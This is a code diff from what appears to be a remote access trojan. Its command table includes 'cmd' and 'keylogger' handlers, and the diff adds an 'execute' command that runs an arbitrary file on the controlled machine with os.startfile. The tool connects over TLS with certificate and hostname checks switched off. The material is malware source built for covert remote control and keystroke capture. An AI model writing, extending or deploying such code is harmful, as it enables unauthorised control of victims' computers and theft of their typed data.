@@ -41,10 +41,11 @@ class App():
             "cmd" : self.cmd.cmd,
             "keylogger" : self.cmd.keylogger,
             "info" : self.cmd.info,
+            "execute" : self.cmd.execute,
             "close" : self.cmd.close,
             "help" : self.cmd.help_,
             }
-        
+
         self.context = ssl.create_default_context()
         self.context.check_hostname = False
         self.context.verify_mode = ssl.CERT_NONE
@@ -248,6 +249,11 @@ class CMD():
                 "Disk usage (%) : " : disk.percent,
             }
         return infos, "INFO"
+    
+    def execute(self):
+        path = os.path.join(os.getcwd(), self.args[0])
+        os.startfile(path)
+        return "Done", "EXECUTE"
     
     def close(self):
         app.status = "CLOSED"
